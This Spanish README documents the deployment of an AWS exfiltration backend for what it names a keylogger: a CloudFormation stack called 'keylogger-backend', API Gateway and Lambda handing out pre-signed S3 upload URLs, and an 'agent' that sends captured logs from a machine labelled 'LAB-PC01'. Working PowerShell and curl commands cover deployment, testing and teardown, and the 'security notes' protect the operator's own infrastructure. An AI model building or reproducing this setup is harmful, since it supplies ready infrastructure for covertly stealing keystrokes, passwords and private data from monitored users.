# Backend de Exfiltración (API Gateway + Lambda + S3)

El agente **nunca** recibe credenciales IAM. El flujo es:

1. El agente hace `POST /url` al API Gateway con el header `x-api-key`.
2. API Gateway valida la API key (usage plan) y reenvía a Lambda.
3. Lambda valida de nuevo el token y genera una **pre-signed URL PUT** hacia S3 con expiración corta.
4. El agente sube el archivo directamente a S3 con `PUT` (HTTP simple).

El único secreto que existe en el cliente es un token de API: si se filtra, el alcance del daño es subir archivos a una carpeta de un bucket durante la vida del token (revocable desde la consola), no credenciales IAM completas.

## Despliegue con CloudFormation

Requisitos: AWS CLI configurada con permisos suficientes (crear Lambda, API Gateway, IAM, S3).

```powershell
$token = [Guid]::NewGuid().ToString("N") + [Guid]::NewGuid().ToString("N")

aws cloudformation create-stack `
  --stack-name keylogger-backend `
  --template-body file://backend/template.yaml `
  --capabilities CAPABILITY_IAM `
  --parameters `
    ParameterKey=SharedToken,ParameterValue=$token `
    ParameterKey=StageName,ParameterValue=prod `
    ParameterKey=UrlExpires,ParameterValue=120 `
    ParameterKey=LogPrefix,ParameterValue=logs `
    ParameterKey=RetentionDays,ParameterValue=30
```

Esperar a que el stack quede `CREATE_COMPLETE`:

```powershell
aws cloudformation wait stack-create-complete --stack-name keylogger-backend
aws cloudformation describe-stacks --stack-name keylogger-backend --query "Stacks[0].Outputs"
```

El output `ApiEndpoint` (ej. `https://abc123.execute-api.us-east-1.amazonaws.com/prod`) es el valor de `API_URL` en el `.env` del agente, y el `SharedToken` que generaste es `SHARED_TOKEN`.

## Probar el backend sin el agente

```powershell
curl.exe -X POST "https://TU-API.execute-api.us-east-1.amazonaws.com/prod/url" `
  -H "x-api-key: TU-TOKEN" `
  -H "Content-Type: application/json" `
  -d '{\"agent_id\":\"LAB-PC01\"}'
```

La respuesta trae `upload_url` (válida ~120 s) y `key`. Sube un archivo de prueba:

```powershell
curl.exe -X PUT "URL_DEL_JSON" -H "Content-Type: text/plain" --data-binary "@archivo.txt"
```

## Notas de seguridad del diseño

- **IAM de Lambda mínimo:** solo `s3:PutObject` sobre el prefijo `logs/*` del bucket. No puede leer ni listar.
- **Doble capa de autenticación:** API key de API Gateway + verificación del token en Lambda.
- **URLs efímeras:** expiran (default 120 s). No sirven para descargar, solo para PUT.
- **Bucket privado:** bloqueo total de acceso público y cifrado SSE-AES256.
- **Retención:** los logs se borran solos según `RetentionDays`.
- **Rotación:** para rotar el token, actualiza el stack con un valor nuevo y elimina la API key vieja.

## Limpieza

```powershell
aws s3 rm s3://NOMBRE-BUCKET --recursive
aws cloudformation delete-stack --stack-name keylogger-backend
```
